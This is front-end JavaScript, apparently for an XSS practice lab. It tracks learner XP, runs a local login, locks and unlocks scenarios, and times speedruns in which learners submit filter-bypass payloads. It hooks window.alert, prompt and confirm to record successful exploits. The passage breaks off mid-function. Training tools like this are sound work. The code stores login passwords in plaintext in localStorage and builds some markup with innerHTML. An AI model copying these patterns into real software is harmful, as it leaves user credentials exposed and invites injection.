// UI interactions: highlighting metadata and switching pages
document.addEventListener('DOMContentLoaded', ()=>{

  const bodyEl = document.body;
  const escapeSelector = (value) => {
    if (window.CSS && typeof window.CSS.escape === 'function'){
      return window.CSS.escape(value);
    }
    return String(value || '').replace(/(["'\\\[\]\.:#])/g, '\\$1');
  };
  const getToastStack = () => {
    let stack = document.querySelector('.easter-toast-stack');
    if (!stack){
      stack = document.createElement('div');
      stack.className = 'easter-toast-stack';
      document.body.appendChild(stack);
    }
    return stack;
  };

  const showToast = (message) => {
    if (!message){
      return;
    }
    const stack = getToastStack();
    const toast = document.createElement('div');
    toast.className = 'easter-toast';
    toast.textContent = message;
    stack.appendChild(toast);
    requestAnimationFrame(()=> toast.classList.add('is-visible'));
    setTimeout(()=>{
      toast.classList.remove('is-visible');
      setTimeout(()=>{
        toast.remove();
        if (!stack.children.length){
          stack.remove();
        }
      }, 260);
    }, 2200);
  };

  const sleep = (ms = 0) => new Promise(resolve => setTimeout(resolve, ms));

  const goToPage = (page)=>{
    const params = new URLSearchParams(window.location.search);
    params.set('page', page);
    const next = params.toString();
    window.setTimeout(()=>{
      window.location.search = next;
    }, 110);
  };

  // highlight corresponding metadata when focusing inputs
  document.querySelectorAll('[data-field]').forEach(el=>{
    el.addEventListener('focus', ()=> {
      const name = el.getAttribute('data-field');
      document.querySelectorAll('.meta-item').forEach(mi=>{
        mi.classList.toggle('field-highlight', mi.dataset.field === name);
      });
    });
    el.addEventListener('blur', ()=> {
      document.querySelectorAll('.meta-item').forEach(mi=>{
        mi.classList.remove('field-highlight');
      });
    });
  });

  // navigation buttons in sidebar and home cards
  const navToggle = document.querySelector('[data-nav-toggle]');
  const navOverlay = document.querySelector('[data-nav-overlay]');
  const sidebar = document.querySelector('[data-sidebar]');
  const closeNav = () => {
    if (!bodyEl){
      return;
    }
    bodyEl.classList.remove('nav-open');
    navToggle?.setAttribute('aria-expanded', 'false');
  };
  const openNav = () => {
    if (!bodyEl){
      return;
    }
    bodyEl.classList.add('nav-open');
    navToggle?.setAttribute('aria-expanded', 'true');
  };
  navToggle?.addEventListener('click', ()=>{
    if (bodyEl?.classList.contains('nav-open')){
      closeNav();
    } else {
      openNav();
    }
  });
  navOverlay?.addEventListener('click', closeNav);
  sidebar?.addEventListener('click', (event)=>{
    if (bodyEl?.classList.contains('nav-open') && event.target.closest('a[data-page]')){
      closeNav();
    }
  });
  document.addEventListener('keydown', (event)=>{
    if (event.key === 'Escape'){
      closeNav();
    }
  });

  document.querySelectorAll('[data-page]').forEach(btn=>{
    btn.addEventListener('click', e=>{
      if (btn.tagName === 'SELECT') return;
      e.preventDefault();
      const page = btn.dataset.page;
      if (page){
        goToPage(page);
        closeNav();
      }
    });
  });

  // fancy ripple feedback for all buttons
  document.querySelectorAll('.button').forEach(btn=>{
    btn.addEventListener('click', e=>{
      const rect = btn.getBoundingClientRect();
      const size = Math.max(rect.width, rect.height);
      const ripple = document.createElement('span');
      ripple.className = 'button-ripple';
      const clientX = e.clientX || (rect.left + rect.width / 2);
      const clientY = e.clientY || (rect.top + rect.height / 2);
      ripple.style.width = ripple.style.height = `${size}px`;
      ripple.style.left = `${clientX - rect.left - size / 2}px`;
      ripple.style.top = `${clientY - rect.top - size / 2}px`;
      btn.appendChild(ripple);
      requestAnimationFrame(()=> ripple.classList.add('is-active'));
      setTimeout(()=> ripple.remove(), 450);
    }, {passive:true});
  });

  // Auth + XP tracker
  const xpPerLevel = 100;
  const authStorageKey = 'xsslab_auth_profiles';
  const sanitizeUsername = (value = '') => value.toLowerCase().replace(/[^a-z0-9_-]/g, '').substring(0, 32);

  const authStore = {
    data: { users: {}, currentUser: null },
    load(){
      try {
        const raw = window.localStorage.getItem(authStorageKey);
        if (raw){
          const parsed = JSON.parse(raw);
          if (parsed && typeof parsed === 'object'){
            this.data.users = parsed.users && typeof parsed.users === 'object' ? parsed.users : {};
            this.data.currentUser = typeof parsed.currentUser === 'string' ? parsed.currentUser : null;
          }
        }
      } catch (err) {
        this.data = { users: {}, currentUser: null };
      }
    },
    save(){
      try {
        window.localStorage.setItem(authStorageKey, JSON.stringify(this.data));
      } catch (err) {
        // ignore quota errors
      }
    },
    getDisplayName(){
      if (this.data.currentUser && this.data.users[this.data.currentUser]){
        return this.data.users[this.data.currentUser].username || 'Learner';
      }
      return 'Guest';
    },
    getProfileKey(){
      return this.data.currentUser ? `user-${this.data.currentUser}` : 'guest';
    },
    isLoggedIn(){
      return Boolean(this.data.currentUser);
    },
    register(username, password){
      const cleaned = sanitizeUsername(username);
      if (!cleaned || cleaned.length < 3){
        return { ok: false, reason: 'invalid_username' };
      }
      if (!password || password.length < 4){
        return { ok: false, reason: 'invalid_password' };
      }
      if (this.data.users[cleaned]){
        return { ok: false, reason: 'exists' };
      }
      this.data.users[cleaned] = { username: username.trim(), password };
      this.data.currentUser = cleaned;
      this.save();
      return { ok: true, profile: cleaned };
    },
    login(username, password){
      const cleaned = sanitizeUsername(username);
      const record = this.data.users[cleaned];
      if (!record || record.password !== password){
        return { ok: false, reason: 'invalid_credentials' };
      }
      this.data.currentUser = cleaned;
      this.save();
      return { ok: true, profile: cleaned };
    },
    logout(){
      this.data.currentUser = null;
      this.save();
    }
  };

  authStore.load();

  const xpStore = {
    baseStorageKey: 'xsslab_xp',
    baseCookieKey: 'xsslab_xp',
    namespace: 'guest',
    storageKey: 'xsslab_xp:guest',
    cookieKey: 'xsslab_xp:guest',
    data: { total: 0, completed: {}, tipsUsed: {} },
    setNamespace(name){
      const safe = typeof name === 'string' && name.length ? name : 'guest';
      this.namespace = safe;
      this.storageKey = `${this.baseStorageKey}:${safe}`;
      this.cookieKey = `${this.baseCookieKey}:${safe}`;
    },
    readCookie(){
      const cookies = document.cookie ? document.cookie.split(';') : [];
      for (const raw of cookies){
        const [name, ...rest] = raw.trim().split('=');
        if (name === this.cookieKey){
          try {
            return decodeURIComponent(rest.join('='));
          } catch (err) {
            return null;
          }
        }
      }
      return null;
    },
    writeCookie(value){
      const encoded = encodeURIComponent(value);
      const maxAge = 60 * 60 * 24 * 365;
      document.cookie = `${this.cookieKey}=${encoded};path=/;max-age=${maxAge}`;
    },
    load(){
      let raw = null;
      try {
        raw = window.localStorage.getItem(this.storageKey);
      } catch (err) {
        raw = null;
      }
      if (!raw){
        raw = this.readCookie();
      }
      this.data = { total: 0, completed: {}, tipsUsed: {} };
      if (raw){
        try {
          const parsed = JSON.parse(raw);
          if (typeof parsed === 'object' && parsed){
            this.data.total = Number.isFinite(parsed.total) ? parsed.total : 0;
            this.data.completed = parsed.completed && typeof parsed.completed === 'object' ? parsed.completed : {};
            this.data.tipsUsed = parsed.tipsUsed && typeof parsed.tipsUsed === 'object' ? parsed.tipsUsed : {};
          }
        } catch (err) {
          this.data = { total: 0, completed: {}, tipsUsed: {} };
        }
      }
    },
    save(){
      const payload = JSON.stringify(this.data);
      try {
        window.localStorage.setItem(this.storageKey, payload);
      } catch (err) {
        // ignore storage quota errors
      }
      this.writeCookie(payload);
    },
    ensureTipStore(){
      if (!this.data.tipsUsed || typeof this.data.tipsUsed !== 'object'){
        this.data.tipsUsed = {};
      }
    },
    award(id, amount){
      if (!id || this.data.completed[id]){
        return false;
      }
      const numericAmount = Number.isFinite(amount) ? amount : 0;
      if (numericAmount <= 0){
        return false;
      }
      this.data.total += numericAmount;
      this.data.completed[id] = {
        amount: numericAmount,
        awardedAt: new Date().toISOString()
      };
      this.save();
      return true;
    },
    spendTip(id, amount){
      const numericAmount = Number.isFinite(amount) ? amount : 0;
      if (!id || numericAmount <= 0){
        return { ok: false, reason: 'invalid' };
      }
      this.ensureTipStore();
      if (this.data.tipsUsed[id]){
        return { ok: true, already: true };
      }
      const total = Math.max(0, Math.round(this.data.total));
      if (total < numericAmount){
        return { ok: false, reason: 'insufficient' };
      }
      this.data.total = total - numericAmount;
      this.data.tipsUsed[id] = {
        cost: numericAmount,
        unlockedAt: new Date().toISOString()
      };
      this.save();
      return { ok: true, spent: numericAmount };
    },
    reset(){
      this.data = { total: 0, completed: {}, tipsUsed: {} };
      this.save();
    }
  };

  xpStore.setNamespace(authStore.getProfileKey());
  xpStore.load();

  const levelEl = document.getElementById('xp-level');
  const totalEl = document.getElementById('xp-total');
  const progressFill = document.getElementById('xp-progress-fill');
  const resetBtn = document.getElementById('xp-reset');
  const xpHudEl = document.querySelector('[data-xp-hud]');
  const authStatusEl = document.querySelector('[data-auth-status]');
  const authLogoutBtn = document.querySelector('[data-auth-logout]');
  const authModal = document.querySelector('[data-auth-modal]');
  const authOpenButtons = document.querySelectorAll('[data-auth-open]');
  const authCloseBtn = authModal?.querySelector('[data-auth-close]');
  const authTabs = authModal ? Array.from(authModal.querySelectorAll('[data-auth-tab]')) : [];
  const authForms = authModal ? Array.from(authModal.querySelectorAll('[data-auth-form]')) : [];
  let activeAuthTab = 'login';
  const authErrorMessages = {
    invalid_username: 'Pick a username with at least 3 letters or numbers.',
    invalid_password: 'Use a password with at least 4 characters.',
    exists: 'That username is already taken.',
    invalid_credentials: 'Incorrect username/password combination.'
  };
  let updateScenarioLocks = () => {};
  const refreshTipVaults = () => {
    document.querySelectorAll('[data-tip-vault]').forEach(vault => {
      if (typeof vault._tipRefresh === 'function'){
        vault._tipRefresh();
      } else if (typeof vault._tipLock === 'function'){
        vault._tipLock();
      }
    });
  };
  const refreshSpeedrunWidgets = () => {
    document.querySelectorAll('[data-speedrun]').forEach(shell => {
      if (typeof shell._speedrunRefresh === 'function'){
        shell._speedrunRefresh();
      }
    });
  };

  const refreshShowMeWidgets = () => {
    document.querySelectorAll('[data-show-me-shell]').forEach(shell => {
      if (typeof shell._showMeRefresh === 'function'){
        shell._showMeRefresh();
      }
    });
  };

  const showXpDelta = (amount) => {
    if (!xpHudEl || !Number.isFinite(amount) || amount === 0){
      return;
    }
    const pop = document.createElement('div');
    pop.className = 'xp-pop';
    if (amount < 0){
      pop.classList.add('is-negative');
    }
    const prefix = amount > 0 ? '+' : '';
    pop.textContent = `${prefix}${amount} XP`;
    xpHudEl.appendChild(pop);
    requestAnimationFrame(()=>{
      pop.classList.add('is-visible');
    });
    setTimeout(()=>{
      pop.classList.add('is-leaving');
    }, 1400);
    setTimeout(()=>{
      pop.remove();
    }, 1900);
  };

  const updateHud = () => {
    if (!levelEl || !totalEl || !progressFill){
      return;
    }
    const total = Math.max(0, Math.round(xpStore.data.total));
    const level = Math.floor(total / xpPerLevel) + 1;
    const progress = (total % xpPerLevel) / xpPerLevel;
    levelEl.textContent = `Level ${level}`;
    totalEl.textContent = `${total} XP`;
    progressFill.style.width = `${Math.min(100, Math.max(0, progress * 100))}%`;
    progressFill.setAttribute('aria-valuenow', String(Math.round(progress * 100)));
    progressFill.setAttribute('aria-label', `Progress to next level: ${Math.round(progress * 100)}%`);
  };

  updateHud();

  const setAuthTab = (name) => {
    activeAuthTab = name;
    authTabs.forEach(tab => {
      const isActive = tab.dataset.authTab === name;
      tab.classList.toggle('is-active', isActive);
    });
    authForms.forEach(form => {
      const matches = form.dataset.authForm === name;
      if (matches){
        form.removeAttribute('hidden');
      } else {
        form.setAttribute('hidden', '');
      }
    });
  };

  const openAuthModal = () => {
    if (!authModal){
      return;
    }
    setAuthTab(activeAuthTab);
    authModal.removeAttribute('hidden');
    authModal.setAttribute('aria-hidden', 'false');
    bodyEl?.classList.add('auth-modal-open');
  };

  const closeAuthModal = () => {
    if (!authModal){
      return;
    }
    authModal.setAttribute('hidden', '');
    authModal.setAttribute('aria-hidden', 'true');
    bodyEl?.classList.remove('auth-modal-open');
  };

  const syncAuthUi = () => {
    const isLoggedIn = authStore.isLoggedIn();
    if (authStatusEl){
      authStatusEl.textContent = isLoggedIn
        ? `Logged in as ${authStore.getDisplayName()}`
        : 'Guest mode: progress stays on this device.';
    }
    if (authLogoutBtn){
      authLogoutBtn.hidden = !isLoggedIn;
    }
    authOpenButtons.forEach(btn => {
      btn.hidden = isLoggedIn;
    });
  };

  syncAuthUi();

  authOpenButtons.forEach(btn => btn.addEventListener('click', openAuthModal));
  authCloseBtn?.addEventListener('click', closeAuthModal);
  authModal?.addEventListener('click', (event)=>{
    if (event.target === authModal){
      closeAuthModal();
    }
  });
  document.addEventListener('keydown', (event)=>{
    if (event.key === 'Escape' && bodyEl?.classList.contains('auth-modal-open')){
      closeAuthModal();
    }
  });
  authTabs.forEach(tab => {
    tab.addEventListener('click', ()=>{
      const target = tab.dataset.authTab;
      if (target){
        setAuthTab(target);
      }
    });
  });

  const handleProfileChange = () => {
    xpStore.setNamespace(authStore.getProfileKey());
    xpStore.load();
    updateHud();
    refreshXpMarkers();
    refreshTipVaults();
    updateScenarioLocks();
    refreshSpeedrunWidgets();
    refreshShowMeWidgets();
  };

  authForms.forEach(form => {
    form.addEventListener('submit', (event)=>{
      event.preventDefault();
      const formType = form.dataset.authForm;
      const formData = new FormData(form);
      const username = (formData.get('username') || '').toString();
      const password = (formData.get('password') || '').toString();
      let result = null;
      if (formType === 'register'){
        result = authStore.register(username, password);
      } else {
        result = authStore.login(username, password);
      }
      if (result && result.ok){
        syncAuthUi();
        closeAuthModal();
        form.reset();
        handleProfileChange();
        showToast(formType === 'register' ? 'Profile created!' : 'Logged in successfully');
      } else {
        const reason = result && result.reason ? result.reason : 'invalid_credentials';
        showToast(authErrorMessages[reason] || 'Unable to authenticate.');
      }
    });
  });

  authLogoutBtn?.addEventListener('click', ()=>{
    authStore.logout();
    syncAuthUi();
    handleProfileChange();
    showToast('Logged out.');
  });

  const konamiSequence = ['ArrowUp','ArrowUp','ArrowDown','ArrowDown','ArrowLeft','ArrowRight','ArrowLeft','ArrowRight','b','a'];
  const konamiBuffer = [];
  let konamiUnlocked = false;

  window.addEventListener('keydown', (event)=>{
    konamiBuffer.push(event.key);
    if (konamiBuffer.length > konamiSequence.length){
      konamiBuffer.shift();
    }
    const matched = konamiSequence.every((codeKey, index)=>{
      const buffered = konamiBuffer[index];
      return (buffered || '').toLowerCase() === codeKey.toLowerCase();
    });
    if (matched){
      if (!konamiUnlocked){
        konamiUnlocked = true;
        if (bodyEl){
          bodyEl.classList.add('is-hacker');
        }
        if (xpStore.award('konami-easter-egg', 42)){
          showXpDelta(42);
          updateHud();
        }
        showToast('Konami unlocked! neon mode engaged');
      } else {
        showToast('Konami encore! keep hacking');
      }
    }
  });

  const logo = document.querySelector('.logo');
  let logoClicks = 0;
  let logoTimer = null;

  if (logo){
    logo.addEventListener('click', ()=>{
      logoClicks += 1;
      if (logoTimer){
        clearTimeout(logoTimer);
      }
      logoTimer = setTimeout(()=>{
        logoClicks = 0;
      }, 650);
      if (logoClicks >= 5){
        logoClicks = 0;
        if (bodyEl){
          const nowActive = bodyEl.classList.toggle('is-rat');
          if (nowActive && xpStore.award('rat-mode-easter-egg', 13)){
            showXpDelta(13);
            updateHud();
          }
          showToast(nowActive ? 'Rat mode activated! squeak squeak' : 'Rat mode disengaged. back to work');
        }
      }
    });
  }

  if (resetBtn){
    resetBtn.addEventListener('click', ()=>{
      if (window.confirm('Reset XP progress? This will clear all recorded completions.')){
        xpStore.reset();
        updateHud();
        document.querySelectorAll('.xp-marker').forEach(marker => {
          marker.classList.remove('is-complete');
          const button = marker.querySelector('.xp-button');
          const status = marker.querySelector('.xp-marker-status');
          if (button){
            button.disabled = false;
            const award = marker.dataset.xpAward ? parseInt(marker.dataset.xpAward, 10) : 0;
            button.textContent = `Mark complete (+${award} XP)`;
          }
          if (status){
            status.textContent = '';
          }
        });
        refreshTipVaults();
        updateScenarioLocks();
        refreshShowMeWidgets();
      }
    });
  }

  const activateMarker = (marker) => {
    const button = marker.querySelector('.xp-button');
    const status = marker.querySelector('.xp-marker-status');
    const award = marker.dataset.xpAward ? parseInt(marker.dataset.xpAward, 10) : 0;
    const id = marker.dataset.xpId;
    if (xpStore.data.completed[id]){
      marker.classList.add('is-complete');
      if (button){
        button.disabled = true;
        button.textContent = 'Completed';
      }
      if (status){
        status.textContent = `Awarded +${award} XP`;
      }
    } else {
      marker.classList.remove('is-complete');
      if (button){
        button.disabled = false;
        button.textContent = `Mark complete (+${award} XP)`;
      }
      if (status){
        status.textContent = '';
      }
    }
  };

  const refreshXpMarkers = () => {
    document.querySelectorAll('.xp-marker').forEach(marker => {
      activateMarker(marker);
    });
  };

  document.querySelectorAll('.xp-marker').forEach(marker => {
    activateMarker(marker);
    const button = marker.querySelector('.xp-button');
    if (!button){
      return;
    }
    button.addEventListener('click', ()=>{
      const award = marker.dataset.xpAward ? parseInt(marker.dataset.xpAward, 10) : 0;
      const id = marker.dataset.xpId;
      if (xpStore.award(id, award)){
        activateMarker(marker);
        updateHud();
        showXpDelta(award);
        updateScenarioLocks();
      }
    });
  });

  const awardExploitMarker = (markerId) => {
    if (!markerId){
      return false;
    }
    const marker = document.querySelector(`.xp-marker[data-xp-id="${escapeSelector(markerId)}"]`);
    const amount = marker ? parseInt(marker.dataset.xpAward || '0', 10) : 25;
    if (xpStore.award(markerId, amount)){
      if (marker){
        activateMarker(marker);
      }
      updateHud();
      showXpDelta(amount);
      updateScenarioLocks();
      return true;
    }
    return false;
  };

  const getDefaultMarker = () => bodyEl?.dataset.defaultMarker || null;
  window.__xssLabCurrentMarker = window.__xssLabCurrentMarker || null;

  const triggerExploitAward = () => {
    const markerId = window.__xssLabCurrentMarker || getDefaultMarker();
    if (!markerId){
      return;
    }
    if (awardExploitMarker(markerId)){
      showToast('Exploit recorded! XP updated.');
    }
  };

  ['alert','prompt','confirm'].forEach(methodName => {
    const original = window[methodName];
    if (typeof original !== 'function'){
      return;
    }
    window[methodName] = function patched(...args){
      try {
        triggerExploitAward();
      } catch (err) {
        // swallow
      }
      return original.apply(window, args);
    };
  });

  window.__xssLabMarkExploit = triggerExploitAward;

  document.addEventListener('lab:solved', (event)=>{
    if (!event || !event.detail || !event.detail.id){
      return;
    }
    const id = String(event.detail.id);
    const marker = document.querySelector(`.xp-marker[data-xp-id="${escapeSelector(id)}"]`);
    const award = Number.isFinite(event.detail.amount) ? event.detail.amount : (marker ? parseInt(marker.dataset.xpAward || '0', 10) : 0);
    if (xpStore.award(id, award)){
      if (marker){
        activateMarker(marker);
      }
      updateHud();
      showXpDelta(award);
      updateScenarioLocks();
    }
  });

  const initTipVaults = () => {
    document.querySelectorAll('[data-tip-vault]').forEach(vault => {
      const id = vault.dataset.tipId;
      const cost = parseInt(vault.dataset.tipCost || '0', 10);
      const body = vault.querySelector('[data-tip-body]');
      const button = vault.querySelector('[data-tip-toggle]');
      const status = vault.querySelector('[data-tip-status]');

      const syncButtonState = (expanded) => {
        if (!button){
          return;
        }
        button.textContent = expanded ? 'Hide tips' : vault.classList.contains('is-unlocked') ? 'Show tips' : `Unlock tips (-${cost} XP)`;
        button.setAttribute('aria-expanded', expanded ? 'true' : 'false');
      };

      const setLockedState = () => {
        vault.classList.remove('is-unlocked');
        if (body){
          body.setAttribute('hidden', '');
          body.classList.add('is-collapsed');
          body.setAttribute('aria-hidden', 'true');
        }
        if (status){
          status.textContent = 'Tips are locked. Spend XP when you truly need guidance.';
        }
        syncButtonState(false);
      };

      const setUnlockedState = ({ reveal = true, initial = false } = {}) => {
        vault.classList.add('is-unlocked');
        if (body){
          if (reveal){
            body.removeAttribute('hidden');
            body.classList.remove('is-collapsed');
            body.setAttribute('aria-hidden', 'false');
          } else {
            body.setAttribute('hidden', '');
            body.classList.add('is-collapsed');
            body.setAttribute('aria-hidden', 'true');
          }
        }
        const expanded = body ? !body.hasAttribute('hidden') : false;
        syncButtonState(expanded);
        if (status){
          status.textContent = initial ? 'Tips already unlocked. Toggle visibility as needed.' : `Spent ${cost} XP. Tips unlocked!`;
        }
      };

      const refreshState = () => {
        if (xpStore.data.tipsUsed && xpStore.data.tipsUsed[id]){
          setUnlockedState({ reveal: false, initial: true });
          if (button){
            button.textContent = 'Show tips';
          }
        } else {
          setLockedState();
        }
      };

      vault._tipLock = setLockedState;
      vault._tipUnlock = setUnlockedState;
      vault._tipRefresh = refreshState;

      refreshState();

      if (button){
        button.addEventListener('click', ()=>{
          if (!body){
            return;
          }
          if (vault.classList.contains('is-unlocked')){
            const hidden = body.hasAttribute('hidden');
            if (hidden){
              body.removeAttribute('hidden');
              body.classList.remove('is-collapsed');
              body.setAttribute('aria-hidden', 'false');
              button.textContent = 'Hide tips';
              button.setAttribute('aria-expanded', 'true');
            } else {
              body.setAttribute('hidden', '');
              body.classList.add('is-collapsed');
              body.setAttribute('aria-hidden', 'true');
              button.textContent = 'Show tips';
              button.setAttribute('aria-expanded', 'false');
            }
            return;
          }

          const result = xpStore.spendTip(id, cost);
          if (!result.ok){
            if (result.reason === 'insufficient'){
              showToast(`Not enough XP yet. You need ${cost} XP to unlock.`);
            } else {
              showToast('Unable to unlock tips. Try again later.');
            }
            return;
          }

          updateHud();
          if (result.spent){
            showXpDelta(-result.spent);
          }
          setUnlockedState({ reveal: true, initial: false });
        });
      }
    });
  };

  initTipVaults();

  const initScenarioTabs = () => {
    const stack = document.querySelector('[data-scenario-stack]');
    const tabsWrapper = document.querySelector('[data-scenario-tabs]');
    if (!stack || !tabsWrapper){
      return;
    }
    const panels = Array.from(stack.querySelectorAll('.scenario[data-scenario-id]'));
    if (!panels.length){
      return;
    }

    panels.forEach(panel => {
      panel.setAttribute('hidden', '');
    });

    const tabs = [];
    const getPanelById = (id) => panels.find(panel => panel.dataset.scenarioId === id);

    const labelFromPanel = (panel) => {
      const title = panel.querySelector('.section-title');
      if (!title){
        return panel.dataset.scenarioId || 'Scenario';
      }
      const text = title.textContent.trim();
      const colonIndex = text.indexOf(':');
      if (colonIndex !== -1){
        return text.slice(0, colonIndex).trim();
      }
      return text;
    };

    panels.forEach(panel => {
      const id = panel.dataset.scenarioId;
      const label = labelFromPanel(panel);
      const button = document.createElement('button');
      button.type = 'button';
      button.className = 'button scenario-tab';
      button.dataset.scenarioTab = id;
      button.dataset.scenarioIndex = panel.dataset.scenarioIndex || '';
      button.textContent = label;
      button.addEventListener('click', () => {
        if (button.classList.contains('is-locked') || button.disabled){
          showToast('Complete the previous scenario to unlock this tab.');
          return;
        }
        setActiveScenario(id, { syncUrl: true });
      });
      tabsWrapper.appendChild(button);
      tabs.push(button);
    });

    const applyLockStyles = () => {
      panels.forEach(panel => {
        const requirement = panel.dataset.scenarioRequires;
        const unlocked = !requirement || !!xpStore.data.completed[requirement];
        panel.dataset.scenarioLocked = unlocked ? 'false' : 'true';
        panel.classList.toggle('is-locked', !unlocked);
        const tab = tabs.find(btn => btn.dataset.scenarioTab === panel.dataset.scenarioId);
        if (tab){
          if (unlocked){
            tab.classList.remove('is-locked');
            tab.disabled = false;
            tab.removeAttribute('aria-disabled');
          } else {
            tab.classList.add('is-locked');
            tab.disabled = true;
            tab.setAttribute('aria-disabled', 'true');
          }
        }
      });
    };

    const syncUrl = (id) => {
      try {
        const params = new URLSearchParams(window.location.search);
        params.set('page', 'playground');
        params.set('scenario_view', id);
        const next = `${window.location.pathname}?${params.toString()}`;
        window.history.replaceState({}, '', next);
      } catch (err) {
        // ignore history API failures
      }
    };

    const setActiveScenario = (id, { syncUrl: shouldSync = false } = {}) => {
      const panel = getPanelById(id);
      if (!panel || panel.dataset.scenarioLocked === 'true'){
        return false;
      }
      panels.forEach(p => {
        if (p === panel){
          p.removeAttribute('hidden');
          p.classList.add('is-active-panel');
        } else {
          p.setAttribute('hidden', '');
          p.classList.remove('is-active-panel');
        }
      });
      tabs.forEach(btn => {
        const isActive = btn.dataset.scenarioTab === id;
        btn.classList.toggle('is-active', isActive);
        if (isActive){
          btn.classList.remove('is-locked');
          btn.disabled = false;
          btn.removeAttribute('aria-disabled');
        }
      });
      tabsWrapper.dataset.active = id;
      if (shouldSync){
        syncUrl(id);
      }
      return true;
    };

    const ensureVisible = (sync = false) => {
      let desired = tabsWrapper.dataset.active || (panels[0] ? panels[0].dataset.scenarioId : null);
      if (!desired){
        return;
      }
      if (!setActiveScenario(desired, { syncUrl: sync })){
        const fallback = panels.find(panel => panel.dataset.scenarioLocked === 'false');
        if (fallback){
          setActiveScenario(fallback.dataset.scenarioId, { syncUrl: sync });
        }
      }
    };

    updateScenarioLocks = () => {
      applyLockStyles();
      ensureVisible(false);
    };

    applyLockStyles();
    ensureVisible(true);
  };

  initScenarioTabs();

  const formatDuration = (ms) => {
    if (!Number.isFinite(ms) || ms <= 0){
      return '00:00.000';
    }
    const minutes = Math.floor(ms / 60000);
    const seconds = Math.floor((ms % 60000) / 1000);
    const millis = Math.floor(ms % 1000);
    return `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}.${String(millis).padStart(3, '0')}`;
  };

  const speedrunCountKey = 'xsslab_speedrun_count';
  const getSpeedrunBestKey = () => `xsslab_speedrun_best:${authStore.getProfileKey()}`;

  document.querySelectorAll('[data-speedrun]').forEach(shell => {
    const levelsRaw = shell.dataset.levels || '[]';
    let levelPool = [];
    try {
      const parsed = JSON.parse(levelsRaw);
      if (Array.isArray(parsed)){
        levelPool = parsed.filter(Boolean);
      }
    } catch (err) {
      levelPool = [];
    }
    const countInput = shell.querySelector('[data-speedrun-count]');
    const startBtn = shell.querySelector('[data-speedrun-start]');
    const timerEl = shell.querySelector('[data-speedrun-timer]');
    const bestEl = shell.querySelector('[data-speedrun-best]');
    const listEl = shell.querySelector('[data-speedrun-list]');
    const workbench = (() => {
      const targetId = shell.dataset.speedrunWorkbench;
      if (targetId){
        return document.getElementById(targetId);
      }
      return null;
    })();
    const workbenchList = workbench?.querySelector('[data-speedrun-workbench-list]') || null;
    const defaultCount = parseInt(shell.dataset.defaultCount || '5', 10) || 5;
    let activeRun = null;

    const syncBest = () => {
      let bestRaw = null;
      try {
        bestRaw = window.localStorage.getItem(getSpeedrunBestKey());
      } catch (err) {
        bestRaw = null;
      }
      const numeric = bestRaw ? parseInt(bestRaw, 10) : 0;
      if (bestEl){
        bestEl.textContent = numeric > 0 ? formatDuration(numeric) : 'No runs yet';
      }
    };

    const setTimer = (ms) => {
      if (timerEl){
        timerEl.textContent = formatDuration(ms);
      }
    };

    const renderWorkbench = (items = []) => {
      if (!workbenchList){
        return;
      }
      workbenchList.innerHTML = '';
      if (!items || !items.length){
        const placeholder = document.createElement('div');
        placeholder.className = 'speedrun-workbench-empty';
        placeholder.textContent = 'Start a speedrun to generate filter-specific inputs.';
        workbenchList.appendChild(placeholder);
        return;
      }
      items.forEach((item, index) => {
        const form = document.createElement('form');
        form.className = 'speedrun-panel';
        form.method = 'POST';
        form.action = `?page=filter&level=${encodeURIComponent(item.level)}`;
        form.target = '_blank';
        form.dataset.speedrunPanel = item.id;
        if (item.complete){
          form.classList.add('is-complete');
        }
        const title = document.createElement('div');
        title.className = 'speedrun-panel-title';
        title.textContent = `Filter ${index + 1}: ${item.name}`;
        form.appendChild(title);
        const helper = document.createElement('div');
        helper.className = 'speedrun-panel-helper small';
        helper.textContent = 'Submitting opens this level in a new tab so the timer keeps running.';
        form.appendChild(helper);
        const textarea = document.createElement('textarea');
        textarea.className = 'input';
        textarea.name = 'input';
        textarea.rows = 3;
        textarea.placeholder = `Payload for ${item.name}`;
        form.appendChild(textarea);
        const hiddenLevel = document.createElement('input');
        hiddenLevel.type = 'hidden';
        hiddenLevel.name = 'level';
        hiddenLevel.value = item.level;
        form.appendChild(hiddenLevel);
        const hiddenSelect = document.createElement('input');
        hiddenSelect.type = 'hidden';
        hiddenSelect.name = 'level_select';
        hiddenSelect.value = item.level;
        form.appendChild(hiddenSelect);
        const actions = document.createElement('div');
        actions.className = 'speedrun-panel-actions';
        const submit = document.createElement('button');
        submit.type = 'submit';
        submit.className = 'button';
        submit.textContent = 'Send to filter lab';
        actions.appendChild(submit);
        form.appendChild(actions);
        const status = document.createElement('div');
        status.className = 'speedrun-panel-status small';
        status.textContent = item.complete ? 'Marked as bypassed. On to the next filter!' : 'After it executes, click "Log bypass" above to track it.';
        form.appendChild(status);
        workbenchList.appendChild(form);
      });
    };

    const renderList = (items) => {
      if (listEl){
        listEl.innerHTML = '';
        if (!items || !items.length){
          const empty = document.createElement('div');
          empty.className = 'speedrun-empty';
          empty.textContent = 'Hit "Start run" to generate filters.';
          listEl.appendChild(empty);
        } else {
          items.forEach((item, index) => {
            const row = document.createElement('div');
            row.className = 'speedrun-item';
            if (item.complete){
              row.classList.add('is-complete');
            }
            row.dataset.speedrunItem = item.id;
            const body = document.createElement('div');
            body.className = 'speedrun-item-body';
            body.innerHTML = `<div class="speedrun-item-label">Filter ${index + 1}</div><div class="small">${item.name}</div>`;
            const button = document.createElement('button');
            button.type = 'button';
            button.className = 'button speedrun-item-button';
            button.dataset.speedrunComplete = 'true';
            button.textContent = item.complete ? 'Completed' : 'Log bypass';
            button.disabled = item.complete;
            row.appendChild(body);
            row.appendChild(button);
            listEl.appendChild(row);
          });
        }
      }
      renderWorkbench(items);
    };

    const stopRun = () => {
      if (activeRun && activeRun.rafId){
        cancelAnimationFrame(activeRun.rafId);
      }
      activeRun = null;
    };

    const tick = () => {
      if (!activeRun){
        return;
      }
      const elapsed = Date.now() - activeRun.startedAt;
      setTimer(elapsed);
      activeRun.rafId = requestAnimationFrame(tick);
    };

    const markComplete = (id) => {
      if (!activeRun){
        return;
      }
      const item = activeRun.items.find(entry => entry.id === id);
      if (!item || item.complete){
        return;
      }
      item.complete = true;
      renderList(activeRun.items);
      if (activeRun.items.every(entry => entry.complete)){
        const elapsed = Date.now() - activeRun.startedAt;
        stopRun();
        setTimer(elapsed);
        let bestRaw = null;
        try {
          bestRaw = window.localStorage.getItem(getSpeedrunBestKey());
        } catch (err) {
          bestRaw = null;
        }
        const currentBest = bestRaw ? parseInt(bestRaw, 10) : 0;
        if (!currentBest || elapsed < currentBest){
          try {
